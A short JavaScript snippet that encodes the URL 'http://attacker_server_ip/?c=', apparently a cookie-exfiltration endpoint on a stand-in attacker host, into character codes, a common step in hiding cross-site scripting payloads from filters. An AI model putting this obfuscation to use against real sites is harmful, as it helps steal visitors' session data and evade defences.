function ascii(c){
return c.charCodeAt();
}
encoded = "http://attacker_server_ip/?c=".split("").map(ascii);
console.log(encoded)
